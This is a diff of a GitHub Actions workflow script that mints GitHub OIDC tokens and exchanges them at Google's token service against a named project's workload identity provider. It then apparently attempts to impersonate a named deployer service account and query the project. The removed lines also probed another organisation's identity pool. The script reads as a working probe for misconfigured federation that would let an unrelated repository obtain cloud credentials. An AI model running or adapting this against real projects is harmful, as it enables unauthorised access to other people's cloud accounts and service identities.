@@ -15,15 +15,14 @@ jobs:
           PRJ="projects/1076362823794/locations/global/workloadIdentityPools/github-wif-pool/providers/github-provider"
           NUM=1076362823794
           SA="sa-github-deployer-v2@tfm-ms-3.iam.gserviceaccount.com"
-          AUD="https://iam.googleapis.com/$PRJ"
-          ex() { # label audience
-            local lab="$1" aud="$2" j c b
-            j=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$aud")
+          ex() { # label provider-resource-path
+            local lab="$1" pth="$2" j c b
+            j=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com/$pth")
             echo "$j" | jq -r '.value // empty' > tok.jwt
             if [ ! -s tok.jwt ]; then echo "##MINT lab=$lab FAIL"; return; fi
             c=$(curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
               -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
-              --data-urlencode "audience=//iam.googleapis.com/$aud" \
+              --data-urlencode "audience=//iam.googleapis.com/$pth" \
               --data-urlencode "subject_token=$(cat tok.jwt)" \
               -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
               -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
@@ -42,7 +41,7 @@ jobs:
             echo "##API lab=$lab code=$c body=$b"; }
 
           echo "##START target=$PRJ sa=$SA"
-          ex "target" "$AUD"
+          ex "target" "$PRJ"
           FT=$(cat ft.jwt)
           echo "##FT len=${#FT}"
           if [ -n "$FT" ]; then
@@ -51,10 +50,8 @@ jobs:
             api "direct-projects-get" "$FT" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM"
           fi
 
-          # negative control 1: fabricated provider under the same project
-          ex "neg-fabricated" "https://iam.googleapis.com/projects/$NUM/locations/global/workloadIdentityPools/github-wif-pool/providers/does-not-exist-xyz"
-          # negative control 2: known repo-pinned provider (varcavia)
-          ex "neg-varcavia" "https://iam.googleapis.com/projects/826570341026/locations/global/workloadIdentityPools/varcavia-github-pool/providers/varcavia-github-provider"
+          ex "neg-fabricated-provider" "projects/$NUM/locations/global/workloadIdentityPools/github-wif-pool/providers/does-not-exist-xyz"
+          ex "neg-fabricated-pool" "projects/$NUM/locations/global/workloadIdentityPools/no-such-pool/providers/github-provider"
 
           if [ -z "$FT" ]; then echo "##ABORT no federated token"; exit 0; fi
           jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
